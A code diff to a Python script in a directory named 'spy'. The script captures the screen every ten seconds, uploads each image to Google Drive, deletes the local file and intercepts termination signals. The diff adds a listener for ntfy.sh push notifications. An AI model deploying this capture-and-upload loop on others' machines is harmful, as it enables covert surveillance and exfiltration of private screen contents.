@@ -19,6 +19,11 @@ from googleapiclient.discovery import build
 from googleapiclient.errors import HttpError
 from googleapiclient.http import MediaFileUpload
 
+import json
+import asyncio
+import websockets
+from plyer import notification
+
 
 load_dotenv('/usr/local/src/spy/.env')
 NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')
@@ -97,12 +102,39 @@ def handle_signal(signal_number, frame):
     except Exception as e:
         print(e)
 
-if __name__ == "__main__":
-    
-    # Register the handler for all signals (for demonstration purposes, capturing SIGINT and SIGTERM)
-    for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
-        signal.signal(sig, handle_signal)
+# Function to handle receiving messages from the WebSocket
+async def subscribe_to_topic():
+    # Define the ntfy server and topic
+    ntfy_server_url = "wss://ntfy.sh"  # WebSocket URL for ntfy
+    topic = os.getenv('NTFY_TOPIC')
 
+    # Define the WebSocket URL for the topic
+    ws_url = f"{ntfy_server_url}/{topic}/ws"
+    try:
+        # Establish WebSocket connection
+        async with websockets.connect(ws_url) as websocket:
+            print(f"Connected to WebSocket for topic: {topic}")
+
+            # Continuously listen for messages
+            while True:
+                try:
+                    message = json.loads(await websocket.recv())  # Wait for a message
+                    print(f"New message: {message}")
+                     # Display the message as a system notification
+                    notification.notify(
+                        title=f"Message Received",
+                        message=message['message'],
+                        #icon_path="your-icon-path.png",  # Optional, specify if you want an icon
+                        timeout=10
+                    )
+                except Exception as e:
+                    print(e)
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+async def take_screenshot_periodically():
     while True:
         try:
             print(datetime.now(), 'Taking screenshot...')
@@ -119,9 +151,27 @@ if __name__ == "__main__":
                     print(e)
                     print('Uploading file on google drive...', filename)
                     upload_file_on_google_drive(filename, folder_id);os.unlink(filename)                    
-
         except Exception as e:
             print(e)
         print('sleeping...')
-        time.sleep(10)
+        await asyncio.sleep(10)
+
+# Main function to run both tasks concurrently
+async def main():
+    # Start both tasks concurrently
+    await asyncio.gather(
+        subscribe_to_topic(),
+        take_screenshot_periodically(),  # Add your screenshot task here
+    )
+
+if __name__ == "__main__":
+    
+    # Register the handler for all signals (for demonstration purposes, capturing SIGINT and SIGTERM)
+    for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
+        signal.signal(sig, handle_signal)
+    
+    asyncio.run(main())
+
+
+    
 
